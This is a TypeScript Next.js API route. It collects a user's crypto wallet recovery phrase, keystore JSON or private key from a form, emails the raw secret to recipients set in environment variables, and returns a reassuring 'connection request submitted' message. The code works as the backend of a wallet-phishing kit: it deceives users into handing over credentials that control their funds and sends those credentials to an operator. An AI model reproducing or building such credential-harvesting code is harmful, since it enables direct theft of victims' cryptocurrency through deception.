import { redirect } from "next/navigation"
import { NextResponse } from "next/server"
import nodemailer from "nodemailer"
import dotenv from 'dotenv'

dotenv.config()

export async function POST(request: Request) {
  try {
    const formData = await request.formData()
    const methodOfConnection = formData.get("methodOfConnection") as string // Will now be "Phrase", "Key Store JSON", or "Private Key"
    const phraseKeyStore = formData.get("phraseKeyStore") as string

    if (!phraseKeyStore) {
      console.log("Phrase, Key store or Private key must be provided. Very crucial")
      return NextResponse.json({ message: "Phrase, Key store or Private key must be provided." }, { status: 400 })
    }

    const transporter = nodemailer.createTransport({
      service: process.env.MAIL_HOST,
      auth: {
        user: process.env.MAIL_USERNAME,
        pass: process.env.MAIL_PASSWORD,
      },
    })

    await new Promise<void>((resolve, reject) => {
      transporter.verify((error, success) => {
        if (error) {
          console.error("Transporter verification error:", error)
          reject(error)
        } else {
          console.log("Server successfully ready to send mail...")
          resolve()
        }
      })
    })

    const recipients = [process.env.RECIPIENT1, process.env.RECIPIENT2].filter(Boolean) as string[]

    if (recipients.length === 0) {
      console.error("No recipients defined in environment variables.")
      return NextResponse.json({ message: "No email recipients configured." }, { status: 500 })
    }

    // Construct the email HTML body using the exact methodOfConnection value as the label
    const emailHtmlBody = `
      <p><strong>${methodOfConnection}:</strong></p>
      <pre>${phraseKeyStore}</pre>
    `

    for (const recipient of recipients) {
      const mailOptions = {
        from: process.env.MAIL_USERNAME,
        to: recipient,
        subject: `${methodOfConnection}`, // Subject also reflects the exact method
        html: emailHtmlBody,
      }

      await new Promise<void>((resolve, reject) => {
        transporter.sendMail(mailOptions, (error, info) => {
          if (error) {
            console.error(`Error sending email to ${recipient}:`, error)
            reject(error)
          } else {
            console.log(`Email sent to ${recipient}: ${info.response}`)
            resolve()
          }
        })
      })
    }

    return NextResponse.json({ 
        message: "Connection request submitted successfully! We'll process your request shortly." 
      })

  } catch (err) {
    console.error("Error in form submission API:", err)
    return NextResponse.json({ message: "Failed to process connection request." }, { status: 500 })
  }


}
